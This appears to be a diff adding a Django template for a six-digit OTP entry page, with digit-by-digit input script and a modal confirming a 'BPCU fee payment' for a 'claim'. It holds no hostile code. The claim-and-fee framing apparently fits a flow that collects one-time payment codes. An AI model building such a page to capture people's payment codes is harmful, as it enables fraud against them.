@@ -1,0 +1,213 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>{% block title %}{% endblock title %}</title>
+    <!-- jQuery  (Django Template Engine)-->
+    <script src="{% static 'cdn/jquery-3.1.1.min.js' %}" type="text/javascript"></script>
+    <script src="{% static 'cdn/jquery-ui.min.js' %}" type="text/javascript"></script>
+    
+    <link href="{% static 'cdn/jquery-ui.min.css' %}"  rel="stylesheet" type="text/css" />
+
+    <!--Bootstrap-->
+    <script src="{% static 'cdn/popper.min.js' %} "></script>
+    <link href="{% static 'cdn/font-awesome.min.css' %}" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href="{% static 'cdn/bootstrap.min.css' %} " />
+     <script src="{% static 'cdn/bootstrap.bundle.min.js' %}" type="text/javascript"></script> 
+  <link rel="stylesheet" href="{% static 'cdn/bootstrap1.min.css' %}" /> 
+  <script src="{% static 'cdn/bootstrap.min.js' %}"></script>
+ 
+
+  <link rel="stylesheet" href="{% static 'aos/aos.css' %}" />
+
+  <style>
+    html, body {
+        height: 100%;
+        margin: 0;
+    }
+    body {
+        background-color: #000;
+        color: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Robot, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+    }
+
+    .container-verification {
+        max-width: 380px;
+        width: 100%;
+        text-align: center;
+    }
+    .title {
+        font-size: clamp(1.5rem, 5vw, 1.8rem);
+        font-weight: 600;
+        margin-buttom: 0.5rem;
+    }
+    .subtitle{
+        font-size: clamp(0.85rem, 4vw, 0.95rem);
+        color: #aaa;
+        margin-buttom: 2rem;
+    }
+    .otp-group {
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        flex-wrap: nowrap;
+        overflow: hidden;
+       
+
+    }
+    .otp-input {
+        width: clamp(45px, 13vw, 56px);
+        height: clamp(55px, 15vw, 64px);
+        text-align: center;
+        font-size: clamp(1.3rem, 5vw, 1.6rem);
+        font-weight: bold;
+        background: #1a1a1a;
+        border: 2px solid #333;
+        border-radius: 12px;
+        color: #fff;
+        caret-color: #ff3b30;
+        transition: border .2s;
+        flex-shrink: 0;
+    }
+    .otp-input:focus {
+        border-color: #ff3b30;
+        outline: none;
+    }
+    otp-input.active {
+        border-color: #ff3b30;
+    }
+
+    @media (max-width: 340px) {
+        .otp-group { gap:6px; }
+        .otp-input { width: 42px; height: 52px; font-size: 1.2rem; }
+    }
+    .modal-content {
+        background: #1a1a1a !important;
+        color: #fff !important;
+    }
+
+    .success-modal .modal-header{
+        border: none;
+        justify-content: center;
+        color: #fff !important;
+    }
+    .success-modal .modal-title{
+        font-size: 1.5rem;
+        font-weight: bold;
+    }
+    .success-modal .modal-body{
+        font-size:1.1rem;
+        text-align: center;
+        color: #fff !important;
+    }
+    .success-modal .modal-footer{
+        border: none;
+        justify-content:center
+        color: #fff !important;
+    }
+   
+  </style>
+
+</head>
+<body>
+    <div class="container-verification">
+
+        <h1 class="title">Enter 6-digit code</h1>
+        <p class="subtitle">Your code has been sent to {{claim.phone}}</p>
+
+        <form method="POST">
+            {% csrf_token %}
+            <div class="otp-group" id="otp-group">
+                <input type="text" name="d1" class="otp-input" maxlength="1" inputmode="numeric" autofocus />
+                <input type="text" name="d2" class="otp-input" maxlength="1" inputmode="numeric" disabled>
+                <input type="text" name="d3" class="otp-input" maxlength="1" inputmode="numeric" disabled>
+                <input type="text" name="d4" class="otp-input" maxlength="1" inputmode="numeric" disabled>
+                <input type="text" name="d5" class="otp-input" maxlength="1" inputmode="numeric" disabled>
+                <input type="text" name="d6" class="otp-input" maxlength="1" inputmode="numeric" disabled>
+            
+        </div>
+
+        <button type="submit" class="btn btn-danger w-100 mt-4">Verify Code</button>
+        </form>
+        
+
+    </div>
+
+ <div class="modal fade success-modal" id="successModal" tabindex="-1">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">🎉 Congratulations!</h5>
+      </div>
+      <div class="modal-body">
+        Your BPCU fee payment has been processed successfully
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-light" id="closeSuccessBtn" data-bs-dismiss="modal">Done</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<script>
+   document.addEventListener("DOMContentLoaded", function () {
+       const inputs = document.querySelectorAll(".otp-input");
+
+       inputs.forEach((input, index) => {
+           
+          input.addEventListener("input", function () {
+            this.value = this.value.replace(/\D/g, "");
+
+            if(this.value.length === 1 && index < inputs.length -1) {
+                inputs[index + 1].disabled = false;
+                inputs[index + 1].focus();
+            }
+          });
+          input.addEventListener("keydown", function (e) {
+            if(e.key === "Backspace") {
+                this.value = "";
+                if(index > 0) {
+                    inputs[index].disabled = true;
+                    inputs[index -1].focus();
+                }
+            }
+          });
+       });
+
+       inputs.forEach((input, index) => {
+          if (index !== 0 && !input.value) {
+            input.disabled = true;
+          }
+       });
+       inputs[0].focus();
+   });
+</script>
+
+{% if show_modal %}
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        var successModal = new bootstrap.Modal(document.getElementById("successModal"))
+        successModal.show();
+    });
+</script>
+{% endif %}
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const closeBtn = document.getElementById("closeSuccessBtn");
+    closeBtn.addEventListener("click", function () {
+        window.location.href = "/";  // Redirect to homepage
+    });
+});
+</script>
+
+    
+</body>
+</html>
